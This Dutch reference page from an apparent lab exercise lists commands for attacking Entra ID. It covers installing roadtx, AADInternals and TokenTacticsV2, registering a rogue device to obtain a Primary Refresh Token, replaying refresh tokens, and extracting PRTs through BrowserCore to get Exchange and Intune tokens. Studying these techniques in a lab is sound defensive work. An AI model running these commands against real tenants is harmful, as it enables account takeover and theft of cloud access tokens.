---
title: "Commando's"
nav_order: 1
parent: "Naslag"
---

# Commando's

## A.1 Installatie op de attacker-VM

```
py install 3.12
py -3.12 -m pip install roadtx

[Environment]::SetEnvironmentVariable("PATH",
  $env:PATH + ";C:\Users\attacker\AppData\Local\Python\pythoncore-3.12-64\Scripts",
  [EnvironmentVariableTarget]::User)

Install-Module AADInternals -Scope AllUsers
Install-Module AADInternals-Endpoints -Scope AllUsers

Get-ChildItem -Recurse | Unblock-File
Import-Module "C:\Users\attacker\Downloads\TokenTacticsV2-main\TokenTacticsV2-main\TokenTacticsV2.psd1"
```

## A.2 Controle van de victim

```
dsregcmd /status
whoami /groups
Get-Tpm | Select-Object TpmPresent,TpmReady,LockedOut,LockoutCount,LockoutMax,LockoutHealTime
```

## A.3 Aanvallen

```
# Toestelregistratie en PRT
roadtx gettokens -u 28_tu_token@aplab.be -p '<wachtwoord>' -r devicereg
roadtx device -a join -n attackerdevice
roadtx prt -u 28_tu_token@aplab.be -p '<wachtwoord>' --key-pem attackerdevice.key --cert-pem attackerdevice.pem
roadtx prtauth -r https://graph.microsoft.com

# Refresh-token replay
roadtx gettokens -u 28_tu_token@aplab.be -p '<wachtwoord>' -r msgraph
roadtx refreshtokento -r msgraph

# BrowserCore op de victim
$prtToken = Get-AADIntUserPRTToken -Method BrowserCore
Get-AADIntAccessTokenForEXO -PRTToken $prtToken -SaveToCache
Get-AADIntAccessTokenForIntuneMDM -PRTToken $prtToken -SaveToCache

# Token inspecteren
roadtx describe -f .roadtools_auth
```
